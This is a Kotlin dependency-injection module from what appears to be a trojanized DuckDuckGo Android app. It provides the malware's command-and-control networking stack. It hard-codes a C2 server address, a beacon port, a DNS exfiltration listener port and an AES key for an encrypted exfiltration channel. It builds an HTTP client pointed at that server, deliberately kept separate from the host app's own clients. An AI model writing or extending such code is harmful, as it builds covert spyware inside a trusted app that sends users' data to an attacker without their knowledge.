package com.duckduckgo.trojan.impl.di

import com.duckduckgo.di.scopes.AppScope
import com.duckduckgo.trojan.impl.C2ApiService
import com.squareup.anvil.annotations.ContributesTo
import dagger.Module
import dagger.Provides
import dagger.SingleInstanceIn
import okhttp3.OkHttpClient
import retrofit2.Retrofit
import retrofit2.converter.moshi.MoshiConverterFactory
import java.util.concurrent.TimeUnit
import javax.inject.Named

/**
 * Dagger module that provides the C2 networking stack.
 *
 * We create our OWN OkHttpClient and Retrofit instance, separate from DDG's.
 * DDG's clients point to duckduckgo.com with DDG-specific interceptors —
 * we don't want that for our C2 traffic.
 *
 * @Named("c2") qualifier ensures our instances don't collide with DDG's
 * @Named("api") and @Named("nonCaching") instances.
 */
@Module
@ContributesTo(AppScope::class)
object C2NetworkModule {

    /** IP of the C2 server. Change before building the APK. */
    const val C2_SERVER_IP = "192.168.0.204"

    /** HTTP port for the C2 server beacon endpoints. */
    const val C2_HTTP_PORT = 8000

    /**
     * UDP port for the DNS exfiltration listener on the server.
     * Must match DNS_LISTENER_PORT in server/config.py.
     */
    const val C2_DNS_PORT = 5300

    /**
     * AES-256 shared key (32 bytes) for the HTTPS exfiltration channel.
     * Must match AES_SECRET_KEY in server/config.py.
     */
    const val AES_KEY = "c2k3y1234567890cabcdef1234567890"

    @Provides
    @SingleInstanceIn(AppScope::class)
    @Named("c2")
    fun c2OkHttpClient(): OkHttpClient {
        return OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build()
    }

    @Provides
    @SingleInstanceIn(AppScope::class)
    @Named("c2")
    fun c2Retrofit(@Named("c2") okHttpClient: OkHttpClient): Retrofit {
        return Retrofit.Builder()
            .baseUrl("http://$C2_SERVER_IP:$C2_HTTP_PORT/")
            .client(okHttpClient)
            .addConverterFactory(MoshiConverterFactory.create())
            .build()
    }

    @Provides
    fun c2ApiService(@Named("c2") retrofit: Retrofit): C2ApiService {
        return retrofit.create(C2ApiService::class.java)
    }
}
